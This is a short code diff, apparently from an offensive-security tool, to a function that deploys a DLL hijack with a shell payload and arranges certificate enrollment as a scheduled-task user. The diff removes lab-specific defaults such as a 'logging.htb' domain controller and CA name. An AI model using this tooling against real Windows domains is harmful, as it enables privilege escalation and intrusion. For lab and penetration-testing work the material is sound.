@@ -95,7 +95,7 @@ def _resolve_target_arch(
         return arch
     monitor_text = str(scan.get("monitor_log_excerpt") or "")
     if client is not None:
-        drop = str(finding.get("drop_path") or r"C:\ProgramData\UpdateMonitor")
+        drop = str(finding.get("drop_path") or r"C:\ProgramData")
         for rel in (r"\Logs\monitor.log", r"\logs\monitor.log", r"\monitor.log"):
             path = f"{drop.rstrip('\\')}{rel}"
             safe = path.replace("'", "''")
@@ -138,10 +138,10 @@ def deploy_dll_hijack(
     exclude_ips: set[str] | None = None,
     arch: TargetArch | None = None,
     payload_mode: PayloadMode = "shell",
-    enroll_template: str = "UpdateSrv",
-    enroll_dns: str = "DC01.logging.htb",
-    enroll_ca_name: str = "logging-DC01-CA",
-    enroll_ca_host: str = "DC01.logging.htb",
+    enroll_template: str = "",
+    enroll_dns: str = "",
+    enroll_ca_name: str = "",
+    enroll_ca_host: str = "",
 ) -> DeployResult:
     if session.workspace is None:
         raise RuntimeError("no active workspace")
@@ -204,7 +204,7 @@ def deploy_dll_hijack(
         for warning in validate_enroll_principal(cred.username, machine_template=enroll_profile.machine_context):
             print_warning(warning)
         print_info(
-            f"enroll will execute as task user {run_as} when UpdateChecker Agent runs — "
+            f"enroll will execute as task user {run_as} when the task runs — "
             f"do not run enroll.ps1 manually over WinRM as {cred.username}"
         )
 
